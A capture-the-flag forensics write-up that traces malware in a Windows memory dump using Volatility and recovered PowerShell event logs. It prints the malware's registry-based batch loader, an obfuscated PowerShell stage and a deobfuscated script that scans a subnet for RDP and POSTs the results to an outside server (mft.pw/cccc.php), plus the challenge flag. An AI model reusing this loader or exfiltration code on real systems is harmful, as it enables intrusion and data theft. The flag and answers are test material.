# Vaccine Stealer

**Category**: Misc

**Author**: extr

**Description**: 

An employee's PC at a COVID-19 vaccine manufacturer was infected with a malware.
According to this employee, a strange window popped up while he was formatting his PC and installing some files.
Analyze memory dumps and find traces of the malware.

 - `(1)`: Filename of the malicious executable whose execution finished at last
 - `(2)`: Filename of the executable that ran `(1)`
 - `(3)`: URL of C2 server that received victim's data (except `http(s)://`)
 - Obtain all flag information and enter it in the form of `pbctf{(1)_(2)_(3)}`

**Hints**:
 * None.

**Public files**: 
 * [Google Drive](https://drive.google.com/file/d/10XZD5S2FCdPyugSvoIkWD8s3pH20hQS2/view)

## Solution

Korean write-up is [here](https://www.notion.so/Vaccine-Stealer-5854642d4c934980b6f9561dfdf231af).

### 1

Check `(1)` by `volatility -f ~/Desktop/memory/memory.dmp --profile=Win7SP1x64 pslist`

```
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
...
0xfffffa8031681640 conhost.exe            6888    436      2       56      1      0 2020-11-26 12:59:52 UTC+0000
0xfffffa803177c060 ntuser.pol             5376   1852      0 --------      1      0 2020-11-26 13:00:01 UTC+0000   2020-11-26 13:00:05 UTC+0000
0xfffffa80327ce520 winpmem_v3.3.r         3268   7092      4       68      1      1 2020-11-26 13:00:41 UTC+0000
```

The only exited process is `ntuser.pol`

### 2

1. Check MFTs via `volatility -f ~/Desktop/memory/memory.dmp --profile=Win7SP1x64 mftparser`

```
***************************************************************************
***************************************************************************
MFT entry found at offset 0x616e3300
Attribute: In Use & File
Record Number: 94640
Link count: 2


$STANDARD_INFORMATION
Creation                       Modified                       MFT Altered                    Access Date                    Type
------------------------------ ------------------------------ ------------------------------ ------------------------------ ----
2020-11-26 12:55:37 UTC+0000 2020-11-26 12:55:37 UTC+0000   2020-11-26 12:55:37 UTC+0000   2020-11-26 12:55:37 UTC+0000   Archive & Content not indexed

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2020-11-26 12:55:37 UTC+0000 2020-11-26 12:55:37 UTC+0000   2020-11-26 12:55:37 UTC+0000   2020-11-26 12:55:37 UTC+0000   ProgramData\WINDOW~1.CMD

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2020-11-26 12:55:37 UTC+0000 2020-11-26 12:55:37 UTC+0000   2020-11-26 12:55:37 UTC+0000   2020-11-26 12:55:37 UTC+0000   ProgramData\WindowsPolicyUpdate.cmd
```

2. Extract memory dump of `ntuser.pol` via `volatility -f ~/Desktop/memory/memory.dmp --profile=Win7SP1x64 memdump -p 5376`.
   Find MFT in the memory dump of `ntuser.pol`.

```
Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

20E58000  46 49 4C 45 30 00 03 00 48 A2 08 14 00 00 00 00  FILE0...H¢......
20E58010  04 00 02 00 38 00 01 00 58 03 00 00 00 04 00 00  ....8...X.......
20E58020  00 00 00 00 00 00 00 00 04 00 00 00 B0 71 01 00  ............°q..
20E58030  02 00 00 00 00 00 00 00 10 00 00 00 60 00 00 00  ............`...
20E58040  00 00 00 00 00 00 00 00 48 00 00 00 18 00 00 00  ........H.......
20E58050  21 AB E1 6F F3 C3 D6 01 21 AB E1 6F F3 C3 D6 01  !«áoóÃÖ.!«áoóÃÖ.
20E58060  21 AB E1 6F F3 C3 D6 01 21 AB E1 6F F3 C3 D6 01  !«áoóÃÖ.!«áoóÃÖ.
20E58070  20 20 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ..............
20E58080  00 00 00 00 1C 02 00 00 00 00 00 00 00 00 00 00  ................
20E58090  E8 EE 90 02 00 00 00 00 30 00 00 00 78 00 00 00  èî......0...x...
20E580A0  00 00 00 00 00 00 03 00 5A 00 00 00 18 00 01 00  ........Z.......
20E580B0  A0 01 00 00 00 00 01 00 21 AB E1 6F F3 C3 D6 01   .......!«áoóÃÖ.
20E580C0  21 AB E1 6F F3 C3 D6 01 21 AB E1 6F F3 C3 D6 01  !«áoóÃÖ.!«áoóÃÖ.
20E580D0  21 AB E1 6F F3 C3 D6 01 00 00 00 00 00 00 00 00  !«áoóÃÖ.........
20E580E0  00 00 00 00 00 00 00 00 20 20 00 00 00 00 00 00  ........  ......
20E580F0  0C 02 57 00 49 00 4E 00 44 00 4F 00 57 00 7E 00  ..W.I.N.D.O.W.~.
20E58100  31 00 2E 00 43 00 4D 00 44 00 79 00 55 00 70 00  1...C.M.D.y.U.p.
20E58110  30 00 00 00 88 00 00 00 00 00 00 00 00 00 02 00  0...ˆ...........
20E58120  70 00 00 00 18 00 01 00 A0 01 00 00 00 00 01 00  p....... .......
20E58130  21 AB E1 6F F3 C3 D6 01 21 AB E1 6F F3 C3 D6 01  !«áoóÃÖ.!«áoóÃÖ.
20E58140  21 AB E1 6F F3 C3 D6 01 21 AB E1 6F F3 C3 D6 01  !«áoóÃÖ.!«áoóÃÖ.
20E58150  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
20E58160  20 20 00 00 00 00 00 00 17 01 57 00 69 00 6E 00    ........W.i.n.
20E58170  64 00 6F 00 77 00 73 00 50 00 6F 00 6C 00 69 00  d.o.w.s.P.o.l.i.
20E58180  63 00 79 00 55 00 70 00 64 00 61 00 74 00 65 00  c.y.U.p.d.a.t.e.
20E58190  2E 00 63 00 6D 00 64 00 80 00 00 00 B8 01 00 00  ..c.m.d.€...¸...
20E581A0  00 00 18 00 00 00 01 00 A0 01 00 00 18 00 00 00  ........ .......
20E581B0  40 65 63 68 6F 20 6F 66 66 3B 0D 0A 66 6F 72 20  @echo off;..for 
20E581C0  2F 66 20 22 74 6F 6B 65 6E 73 3D 2A 22 20 25 25  /f "tokens=*" %%
20E581D0  61 20 69 6E 20 28 27 72 65 67 20 71 75 65 72 79  a in ('reg query
20E581E0  20 22 48 4B 45 59 5F 4C 4F 43 41 4C 5F 4D 41 43   "HKEY_LOCAL_MAC
20E581F0  48 49 4E 45 5C 53 4F 46 54 57 41 52 45 5C 4D 69  HINE\SOFTWARE\Mi
20E58200  63 72 6F 73 6F 66 74 5C 57 69 6E 64 6F 77 73 5C  crosoft\Windows\
20E58210  43 6F 6D 6D 75 6E 69 63 61 74 69 6F 6E 22 20 2F  Communication" /
20E58220  76 20 63 6F 64 65 20 5E 7C 20 66 69 6E 64 20 2F  v code ^| find /
20E58230  69 20 22 52 45 47 5F 53 5A 22 27 29 20 64 6F 20  i "REG_SZ"') do 
20E58240  28 0D 0A 20 20 20 20 73 65 74 20 76 61 72 3D 22  (..    set var="
20E58250  25 25 7E 61 22 3B 0D 0A 20 20 20 20 70 6F 77 65  %%~a";..    powe
20E58260  72 73 68 65 6C 6C 20 2D 6E 6F 70 72 6F 66 69 6C  rshell -noprofil
20E58270  65 20 22 25 76 61 72 3A 7E 31 39 2C 31 35 30 30  e "%var:~19,1500
20E58280  25 3B 0D 0A 29 0D 0A 66 6F 72 20 2F 66 20 22 74  %;..)..for /f "t
20E58290  6F 6B 65 6E 73 3D 2A 22 20 25 25 61 20 69 6E 20  okens=*" %%a in 
20E582A0  28 27 72 65 67 20 71 75 65 72 79 20 22 48 4B 45  ('reg query "HKE
20E582B0  59 5F 4C 4F 43 41 4C 5F 4D 41 43 48 49 4E 45 5C  Y_LOCAL_MACHINE\
20E582C0  53 4F 46 54 57 41 52 45 5C 4D 69 63 72 6F 73 6F  SOFTWARE\Microso
20E582D0  66 74 5C 57 69 6E 64 6F 77 73 5C 43 6F 6D 6D 75  ft\Windows\Commu
20E582E0  6E 69 63 61 74 69 6F 6E 22 20 2F 76 20 63 6F 64  nication" /v cod
20E582F0  65 20 5E 7C 20 66 69 6E 64 20 2F 69 20 22 52 45  e ^| find /i "RE
20E58300  47 5F 53 5A 22 27 29 20 64 6F 20 28 0D 0A 20 20  G_SZ"') do (..  
20E58310  20 20 73 65 74 20 76 61 72 3D 22 25 25 7E 61 22    set var="%%~a"
20E58320  3B 0D 0A 20 20 20 20 70 6F 77 65 72 73 68 65 6C  ;..    powershel
20E58330  6C 20 2D 6E 6F 70 72 6F 66 69 6C 65 20 22 25 76  l -noprofile "%v
20E58340  61 72 3A 7E 31 39 2C 31 35 30 30 25 3B 0D 0A 29  ar:~19,1500%;..)
20E58350  FF FF FF FF 82 79 47 11 00 00 00 00 00 00 00 00  ÿÿÿÿ‚yG.........
```

```powershell
@echo off;
for /f "tokens=*" %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication" /v code ^| find /i "REG_SZ"') do (
    set var="%%~a";
    powershell -noprofile "%var:~19,1500%;
)
for /f "tokens=*" %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication" /v code ^| find /i "REG_SZ"') do (
    set var="%%~a";
    powershell -noprofile "%var:~19,1500%;
)
```

Something was happened with `WindowsPolicyUpdate.cmd` (`(2)`). It's a PowerShell script.

### 3

Parse PowerShell logs from the memory dump. There are several ways:

- Write a parser in EVTX format https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc
- Use [EVTXtract](https://github.com/williballenthin/EVTXtract)

```xml
<Record>
<Offset>0x6ba510b0</Offset>
<EventID>4104</EventID>
<Substitutions>
  <Substitution index="0">
    <Type>4</Type>
    <Value>3</Value>
  </Substitution>
  <Substitution index="1">
    <Type>4</Type>
    <Value>15</Value>
  </Substitution>
  <Substitution index="2">
    <Type>6</Type>
    <Value>2</Value>
  </Substitution>
  <Substitution index="3">
    <Type>6</Type>
    <Value>4104</Value>
  </Substitution>
  <Substitution index="4">
    <Type>0</Type>
    <Value></Value>
  </Substitution>
  <Substitution index="5">
    <Type>21</Type>
    <Value>0x0000000000000000</Value>
  </Substitution>
  <Substitution index="6">
    <Type>17</Type>
    <Value>2020-11-26 12:57:02.123913</Value>
  </Substitution>
  <Substitution index="7">
    <Type>15</Type>
    <Value>0001010f-010c-ce58-aa2b-260200001200</Value>
  </Substitution>
  <Substitution index="8">
    <Type>8</Type>
    <Value>7092</Value>
  </Substitution>
  <Substitution index="9">
    <Type>8</Type>
    <Value>6932</Value>
  </Substitution>
  <Substitution index="10">
    <Type>10</Type>
    <Value>7</Value>
  </Substitution>
  <Substitution index="11">
    <Type>4</Type>
    <Value>1</Value>
  </Substitution>
  <Substitution index="12">
    <Type>19</Type>
    <Value>S-1-5-21-3670628630-2135755465-2318507858-1000</Value>
  </Substitution>
  <Substitution index="13">
    <Type>0</Type>
    <Value></Value>
  </Substitution>
  <Substitution index="14">
    <Type>1</Type>
    <Value>Microsoft-Windows-PowerShell</Value>
  </Substitution>
  <Substitution index="15">
    <Type>15</Type>
    <Value>0001010f-010c-ce58-aa2b-260200001200</Value>
  </Substitution>
  <Substitution index="16">
    <Type>1</Type>
    <Value>Microsoft-Windows-PowerShell/Operational</Value>
  </Substitution>
  <Substitution index="17">
    <Type>7</Type>
    <Value>1</Value>
  </Substitution>
  <Substitution index="18">
    <Type>7</Type>
    <Value>1</Value>
  </Substitution>
  <Substitution index="19">
    <Type>1</Type>
    <Value>&amp; ( $veRBOsepReFErEncE.tOstrINg()[1,3]+'x'-JOin'')( nEW-ObjEcT sySTEm.iO.sTreaMReAdER( ( nEW-ObjEcT  SystEm.iO.CompreSsiOn.DEfLATEstREam([IO.meMoryStream] [CoNVeRT]::fROMbASe64StRinG('NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=' ) , [IO.coMPressION.cOMPresSiOnmOde]::dEcOMPresS)), [TexT.ENcODInG]::AsCIi)).ReaDToeNd();;</Value>
  </Substitution>
  <Substitution index="20">
    <Type>1</Type>
    <Value>6f26f753-bcc8-44fa-9a85-b337d6b96ab1</Value>
  </Substitution>
  <Substitution index="21">
    <Type>1</Type>
    <Value></Value>
  </Substitution>
</Substitutions>
</Record><Record>
<Offset>0x6c3536d8</Offset>
<EventID>4104</EventID>
<Substitutions>
  <Substitution index="0">
    <Type>4</Type>
    <Value>3</Value>
  </Substitution>
  <Substitution index="1">
    <Type>4</Type>
    <Value>15</Value>
  </Substitution>
  <Substitution index="2">
    <Type>6</Type>
    <Value>2</Value>
  </Substitution>
  <Substitution index="3">
    <Type>6</Type>
    <Value>4104</Value>
  </Substitution>
  <Substitution index="4">
    <Type>0</Type>
    <Value></Value>
  </Substitution>
  <Substitution index="5">
    <Type>21</Type>
    <Value>0x0000000000000000</Value>
  </Substitution>
  <Substitution index="6">
    <Type>17</Type>
    <Value>2020-11-26 13:00:01.797171</Value>
  </Substitution>
  <Substitution index="7">
    <Type>15</Type>
    <Value>0001010f-010c-ce58-aa2b-260200001200</Value>
  </Substitution>
  <Substitution index="8">
    <Type>8</Type>
    <Value>3904</Value>
  </Substitution>
  <Substitution index="9">
    <Type>8</Type>
    <Value>3404</Value>
  </Substitution>
  <Substitution index="10">
    <Type>10</Type>
    <Value>16</Value>
  </Substitution>
  <Substitution index="11">
    <Type>4</Type>
    <Value>1</Value>
  </Substitution>
  <Substitution index="12">
    <Type>19</Type>
    <Value>S-1-5-21-3670628630-2135755465-2318507858-1000</Value>
  </Substitution>
  <Substitution index="13">
    <Type>0</Type>
    <Value></Value>
  </Substitution>
  <Substitution index="14">
    <Type>1</Type>
    <Value>Microsoft-Windows-PowerShell</Value>
  </Substitution>
  <Substitution index="15">
    <Type>15</Type>
    <Value>0001010f-010c-ce58-aa2b-260200001200</Value>
  </Substitution>
  <Substitution index="16">
    <Type>1</Type>
    <Value>Microsoft-Windows-PowerShell/Operational</Value>
  </Substitution>
  <Substitution index="17">
    <Type>7</Type>
    <Value>1</Value>
  </Substitution>
  <Substitution index="18">
    <Type>7</Type>
    <Value>1</Value>
  </Substitution>
  <Substitution index="19">
    <Type>1</Type>
    <Value>s`eT-V`A`Riab`lE Diq  (  [typE]('sY'+'S'+'tEM.'+'tExT'+'.'+'EnCOdiNg')  );  Set-`VARI`A`B`le  ('Car'+'u1')  (  [TyPe]('ConveR'+'t') )  ;${i`N`V`OkEcO`MmaND} = ((('cm'+'d'+'.exe')+' /'+'c '+'C'+':'+('HaSP'+'r')+('o'+'gr')+'a'+('m'+'Dat')+'aH'+('aSnt'+'user')+'.p'+('ol'+' TC'+'P ')+('172.30'+'.1.0'+'/24 33'+'8')+('9 5'+'12 /'+'B'+'a')+('nne'+'r'))."REPL`A`cE"(([chaR]72+[chaR]97+[chaR]83),[STRInG][chaR]92));
${CMdout`p`Ut} = $(i`NVoK`e-eXPRE`ss`I`on ${I`NvOk`E`cOMMaND});
${B`yT`es} =   ( v`ARiA`BLE  dIQ -VALu )::"U`NI`coDe"."g`etBYTES"(${cm`DOu`TPUt});
${eN`Co`dEd} =   (  I`TEM ('VarI'+'a'+'B'+'LE'+':Caru1')  ).valuE::"ToB`AS`E`64striNG"(${b`Yt`es});
${poSTP`A`R`AmS} = @{"D`ATa"=${e`N`cOded}};
i`N`VOkE-WEb`REQuESt -Uri ('mft.pw'+'/ccc'+'c.ph'+'p') -Method ('POS'+'T') -Body ${p`o`sTpaRaMs};</Value>
  </Substitution>
  <Substitution index="20">
    <Type>1</Type>
    <Value>e43fbca1-00fd-4a63-b84b-5322a7cd1564</Value>
  </Substitution>
  <Substitution index="21">
    <Type>1</Type>
    <Value></Value>
  </Substitution>
</Substitutions>
</Record>
```

Can be unobfuscated to:

```powershell
$invokeCommand = "cmd.exe /c C:\ProgramData\ntuser.pol TCP 172.30.1.0/24 3389 512 /Banner";
$cmdOutput = $(Invoke-Expression $invokeCommand);
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($cmdOutput);
$Encoded = [Convert]::ToBase64String($Bytes);
$postParams = @{data=$Encoded};
Invoke-WebRequest -Uri mft.pw/cccc.php -Method POST -Body $postParams;
```

`(3)` is `mft.pw/cccc.php`.

The flag is `pbctf{ntuser.pol_WindowsPolicyUpdate.cmd_mft.pw/cccc.php}`
